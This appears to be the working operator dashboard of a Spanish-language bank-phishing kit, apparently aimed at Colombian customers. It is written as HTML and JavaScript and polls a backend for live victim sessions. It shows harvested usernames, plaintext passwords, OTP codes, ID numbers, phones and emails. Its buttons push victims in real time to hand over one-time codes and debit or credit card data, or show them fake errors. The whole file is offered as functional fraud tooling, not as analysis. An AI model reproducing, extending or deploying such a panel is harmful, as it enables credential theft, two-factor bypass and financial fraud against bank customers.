<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Monitor - Full Visibility</title>
  <style>
    /* --- CONFIGURACIÓN BASE (NEON DARK) --- */
    :root {
      --bg-body: #050505;
      --bg-card: #0f0f0f;
      --bg-highlight: #1a1a1a;
      
      --neon-red: #ff003c;
      --neon-blue: #00f3ff;
      --neon-green: #00ff41;
      --neon-yellow: #fcee0a;
      
      --text-main: #ffffff;
      --text-dim: #666666;
      
      --border: 1px solid rgba(255,255,255,0.08);
      --font-mono: 'Courier New', Courier, monospace; /* Ideal para datos */
      --font-ui: system-ui, -apple-system, sans-serif;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
    
    body {
      background-color: var(--bg-body);
      color: var(--text-main);
      font-family: var(--font-ui);
      padding: 20px;
      font-size: 14px;
    }

    /* --- LAYOUT --- */
    .wrapper { max-width: 1800px; margin: 0 auto; }
    
    .header {
      display: flex; justify-content: space-between; align-items: center;
      margin-bottom: 25px; padding-bottom: 15px; border-bottom: var(--border);
    }
    .brand { font-size: 20px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
    .brand span { color: var(--neon-red); }

    /* --- TABLA PRINCIPAL --- */
    .table-container { overflow-x: auto; padding-bottom: 50px; }
    
    table { 
      width: 100%; border-collapse: separate; border-spacing: 0 8px; 
      min-width: 1400px; /* Asegura que no se aplaste la info en laptops */
    }

    th {
      text-align: left; color: var(--text-dim); font-size: 11px; 
      text-transform: uppercase; letter-spacing: 1px; padding: 0 15px 10px;
    }

    /* ESTILO DE FILA FLOTANTE */
    tbody tr {
      background: var(--bg-card);
      transition: all 0.2s ease;
    }
    tbody tr:hover {
      background: var(--bg-highlight);
      transform: scale(1.005);
      box-shadow: 0 0 15px rgba(0, 243, 255, 0.05);
    }
    
    td { 
      padding: 15px; vertical-align: middle; 
      border-top: var(--border); border-bottom: var(--border); 
    }
    td:first-child { border-left: var(--border); border-top-left-radius: 8px; border-bottom-left-radius: 8px; }
    td:last-child { border-right: var(--border); border-top-right-radius: 8px; border-bottom-right-radius: 8px; }

    /* --- VISUALIZACIÓN DE DATOS (SIN CENSURA) --- */
    .data-group { display: flex; flex-direction: column; gap: 4px; }
    .label { font-size: 10px; color: var(--text-dim); text-transform: uppercase; }
    
    /* Credenciales (Usuario/Pass) - Resaltado Brillante */
    .cred-box {
      background: rgba(255, 255, 255, 0.03);
      padding: 8px; border-radius: 4px;
      border: 1px solid rgba(255, 255, 255, 0.05);
      font-family: var(--font-mono);
    }
    .cred-val { font-size: 15px; font-weight: bold; letter-spacing: 0.5px; }
    .text-user { color: var(--neon-blue); }
    .text-pass { color: var(--neon-yellow); text-shadow: 0 0 5px rgba(252, 238, 10, 0.3); }
    .text-otp  { color: var(--neon-green); font-size: 16px; font-weight: 900; }

    /* Cliente e Info */
    .client-info { font-weight: 600; color: white; }
    .client-sub { font-size: 12px; color: #999; }

    /* Badges de Estado */
    .badge { 
      padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; 
      text-transform: uppercase; border: 1px solid transparent;
    }
    .st-new { color: var(--neon-blue); border-color: rgba(0,243,255,0.3); background: rgba(0,243,255,0.05); }
    .st-err { color: var(--neon-red); border-color: rgba(255,0,60,0.3); background: rgba(255,0,60,0.05); }
    .st-ok  { color: var(--neon-green); border-color: rgba(0,255,65,0.3); background: rgba(0,255,65,0.05); }

    /* --- BOTONES DE ACCIÓN (GRID) --- */
    .actions-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr); /* 4 botones por fila */
      gap: 6px;
      width: 100%;
      max-width: 380px;
    }

    .btn {
      background: transparent;
      border: 1px solid rgba(255,255,255,0.15);
      color: #aaa;
      padding: 8px 0;
      border-radius: 4px;
      cursor: pointer;
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      transition: all 0.15s;
    }

    .btn:hover { color: white; border-color: white; background: rgba(255,255,255,0.05); }
    .btn:active { transform: translateY(2px); }

    /* Colores específicos por función */
    .btn.otp:hover { border-color: var(--neon-green); color: var(--neon-green); box-shadow: 0 0 8px rgba(0,255,65,0.2); }
    .btn.data:hover { border-color: var(--neon-blue); color: var(--neon-blue); }
    .btn.card:hover { border-color: var(--neon-yellow); color: var(--neon-yellow); }
    .btn.err:hover { border-color: var(--neon-red); color: var(--neon-red); background: rgba(255,0,60,0.1); }
    .btn.fin { grid-column: span 2; border-color: var(--text-dim); } /* Botón ancho */
    .btn.fin:hover { background: var(--text-main); color: black; border-color: white; }

    /* Estado de carga del botón */
    .btn.loading { opacity: 0.5; cursor: wait; pointer-events: none; }

    /* --- UI EXTRA --- */
    .toast {
      position: fixed; top: 20px; right: 20px; padding: 15px 25px;
      background: #111; border: 1px solid #333; color: white;
      transform: translateX(150%); transition: transform 0.3s;
      z-index: 9999; border-left: 4px solid var(--neon-blue);
    }
    .toast.show { transform: translateX(0); }
    
    .timer { font-family: var(--font-mono); color: var(--text-dim); font-size: 12px; }
  </style>
</head>
<body>

<div class="wrapper">
  
  <header class="header">
    <div class="brand">Admin <span>Panel v3</span></div>
    <div style="display:flex; gap:20px; align-items:center;">
      <span class="timer">AUTO-REFRESH: <b id="timer" style="color:white">5</b>s</span>
      <button onclick="logout()" class="btn" style="padding:6px 15px;">Salir</button>
    </div>
  </header>

  <input type="text" id="searchInput" placeholder="Buscar por Cédula, Nombre o IP..." 
         style="width:100%; padding:12px; background:#0f0f0f; border:1px solid #222; color:white; margin-bottom:20px; border-radius:4px;">

  <div class="table-container">
    <table id="sessionsTable">
      <thead>
        <tr>
          <th width="5%">ID</th>
          <th width="15%">Cliente</th>
          <th width="20%">CREDENCIALES (VISIBLE)</th>
          <th width="10%">OTP</th>
          <th width="15%">Contacto</th>
          <th width="10%">Tarjetas</th>
          <th width="25%">Panel de Control</th>
        </tr>
      </thead>
      <tbody id="tableBody">
        </tbody>
    </table>
  </div>

</div>

<div id="toast" class="toast">Notificación</div>

<script>
  /* --- LÓGICA DE NEGOCIO (Rutas Originales) --- */
  
  let countdown = 5;
  let sessionsData = [];
  let isUpdating = false;
  let lastInteraction = Date.now(); // Para pausar si el usuario mueve el mouse

  // Detectar actividad para no refrescar mientras escribes
  ['mousemove', 'keypress', 'click'].forEach(e => {
    document.addEventListener(e, () => lastInteraction = Date.now());
  });

  // --- RENDERING PRINCIPAL ---
  function renderTable(sessions) {
    const tbody = document.getElementById('tableBody');
    
    if (!sessions || sessions.length === 0) {
      tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; padding:40px; color:#444;">Esperando conexiones...</td></tr>`;
      return;
    }

    tbody.innerHTML = sessions.map(s => {
      // Formateo seguro de valores nulos
      const doc = s.nro_doc || '---';
      const user = s.usuario || s.nro_doc || 'No Data'; // Asume documento como usuario si no hay user
      const pass = s.clave || 'Esperando...';
      const otp = s.otp || '---';
      
      return `
        <tr>
          <td>
            <div class="label">#${(s.transaction_id || '').substr(0,4)}</div>
            <div style="color:#555; font-size:11px; margin-top:4px">${s.ip || '?.?.?.?'}</div>
            <div class="badge ${s.status === 'finalizar' ? 'st-ok' : 'st-new'}" style="margin-top:5px; text-align:center">
              ${s.status || 'Nuevo'}
            </div>
          </td>

          <td>
            <div class="client-info">${s.nombre || 'Desconocido'}</div>
            <div class="client-sub">Doc: ${doc}</div>
            <div class="client-sub">${formatDate(s.created_at)}</div>
          </td>

          <td>
            <div class="cred-box">
              <div class="data-group" style="margin-bottom:6px">
                <span class="label">Usuario / Doc</span>
                <span class="cred-val text-user">${user}</span>
              </div>
              <div class="data-group">
                <span class="label">Contraseña</span>
                <span class="cred-val text-pass">${pass}</span>
              </div>
            </div>
          </td>

          <td>
            <div style="text-align:center;">
              <span class="cred-val text-otp">${otp}</span>
            </div>
          </td>

          <td>
             <div style="font-size:12px">📞 ${s.celular || '--'}</div>
             <div style="font-size:11px; color:#777; margin-top:4px">✉️ ${s.email || '--'}</div>
          </td>

          <td>
            <div style="font-size:11px; color:#aaa;">
              Débito: <b style="color:${s.tarjeta_debito ? '#00ff41' : '#444'}">${s.tarjeta_debito ? 'SI' : 'NO'}</b><br>
              Crédito: <b style="color:${s.tarjeta_credito ? '#00ff41' : '#444'}">${s.tarjeta_credito ? 'SI' : 'NO'}</b>
            </div>
          </td>

          <td>
            <div class="actions-grid">
              <button class="btn otp" onclick="handleAction(this, '${s.transaction_id}', 'ir_otp')">PEDIR OTP</button>
              <button class="btn otp" onclick="handleAction(this, '${s.transaction_id}', 'error_otp')">OTP ERR</button>
              <button class="btn data" onclick="handleAction(this, '${s.transaction_id}', 'pedir_datos')">DATOS</button>
              <button class="btn data" onclick="handleAction(this, '${s.transaction_id}', 'pedir_correo')">EMAIL</button>
              
              <button class="btn card" onclick="handleAction(this, '${s.transaction_id}', 'pedir_td')">DEBITO</button>
              <button class="btn card" onclick="handleAction(this, '${s.transaction_id}', 'pedir_tc')">CREDITO</button>
              <button class="btn err" onclick="handleAction(this, '${s.transaction_id}', 'error')">ERROR GEN</button>
              
              <button class="btn fin" onclick="handleAction(this, '${s.transaction_id}', 'finalizar')">✅ FINALIZAR</button>
            </div>
          </td>
        </tr>
      `;
    }).join('');
  }

  // --- MANEJO DE ACCIONES SEGURAS ---
  async function handleAction(btnElement, id, action) {
    // 1. Feedback Visual Inmediato
    const originalText = btnElement.innerText;
    btnElement.innerText = '...';
    btnElement.classList.add('loading');

    try {
      // 2. Ejecutar Petición
      const res = await fetch('/api/update-status', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ transaction_id: id, action: action })
      });

      if (res.ok) {
        showToast(`Comando enviado: ${action}`, 'success');
        // Forzar recarga inmediata
        await loadSessions(); 
        countdown = 5; 
      } else {
        showToast('Error en el servidor', 'error');
      }

    } catch (e) {
      console.error(e);
      showToast('Error de conexión', 'error');
    } finally {
      // 3. Restaurar botón
      btnElement.innerText = originalText;
      btnElement.classList.remove('loading');
    }
  }

  // --- UTILS ---
  async function loadSessions() {
    if (isUpdating) return;
    isUpdating = true;
    try {
      const res = await fetch('/api/admin/sessions');
      if(res.status === 401) window.location.href = '/admin/login';
      const data = await res.json();
      if (data.success) {
        sessionsData = data.sessions || [];
        // Filtrar si hay búsqueda
        filterAndRender();
      }
    } catch (e) { console.error("Sync error", e); }
    finally { isUpdating = false; }
  }

  function filterAndRender(){
    const term = document.getElementById('searchInput').value.toLowerCase();
    const filtered = sessionsData.filter(s => 
      (s.nro_doc && s.nro_doc.includes(term)) ||
      (s.ip && s.ip.includes(term)) ||
      (s.nombre && s.nombre.toLowerCase().includes(term))
    );
    renderTable(filtered);
  }

  document.getElementById('searchInput').addEventListener('input', filterAndRender);

  function logout() {
    if(confirm('¿Salir?')) fetch('/api/admin/logout', {method:'POST'}).then(()=>window.location='/admin/login');
  }

  function showToast(msg, type) {
    const t = document.getElementById('toast');
    t.innerText = msg;
    t.style.borderColor = type === 'error' ? 'var(--neon-red)' : 'var(--neon-green)';
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 3000);
  }

  function formatDate(d) {
    if(!d) return '';
    return new Date(d).toLocaleTimeString('es-CO', {hour:'2-digit', minute:'2-digit'});
  }

  // --- AUTO REFRESH LOOP ---
  setInterval(() => {
    // Si pasaron menos de 3 segs desde la ultima interacción, no refrescar (pausa inteligente)
    if (Date.now() - lastInteraction < 3000) return;
    
    countdown--;
    document.getElementById('timer').innerText = countdown;
    if (countdown <= 0) {
      loadSessions();
      countdown = 5;
    }
  }, 1000);

  // Init
  loadSessions();

</script>
</body>
</html>
